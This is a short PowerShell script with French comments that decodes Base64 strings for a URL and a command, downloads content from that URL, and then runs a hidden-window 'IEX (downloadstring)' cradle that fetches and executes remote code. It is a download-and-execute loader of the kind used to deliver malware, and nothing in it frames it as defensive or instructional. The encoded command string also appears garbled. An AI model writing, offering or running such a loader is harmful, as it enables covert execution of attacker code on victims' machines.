# Fonction pour décoder une chaîne Base64
function Decode-Base64 {
    param (
        [string]$Base64String
    )
    try {
        $Bytes = [System.Convert]::FromBase64String($Base64String)
        return [System.Text.Encoding]::UTF8.GetString($Bytes)
    } catch {
        Write-Error "Erreur lors du décodage Base64: $_"
    }
}

# Chaînes Base64 correctes (assurez-vous qu'elles sont valides)
$Base64Url = "your url encoded base64"
$Base64Command = "SVhFICgobmV3LWFib3qJHRvci5kb3dubG9hZHN0cmluZygnJHRvcmlhbXNodGVtcykoJykp"

# Décoder les chaînes
$DecodedUrl = Decode-Base64 -Base64String $Base64Url
$DecodedCommand = Decode-Base64 -Base64String $Base64Command

# Afficher les valeurs décodées pour vérification
Write-Output "URL Décodée: $DecodedUrl"
Write-Output "Commande Décodée: $DecodedCommand"

# Tester l'accès à l'URL
try {
    $content = (New-Object System.Net.WebClient).DownloadString($DecodedUrl)
    Write-Output "Contenu téléchargé : $content"
} catch {
    Write-Error "Erreur lors du téléchargement du contenu : $_"
}

# Exécuter le code téléchargé
try {
    powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('$DecodedUrl'))"
} catch {
    Write-Error "Erreur lors de l'exécution de la commande: $_"
}
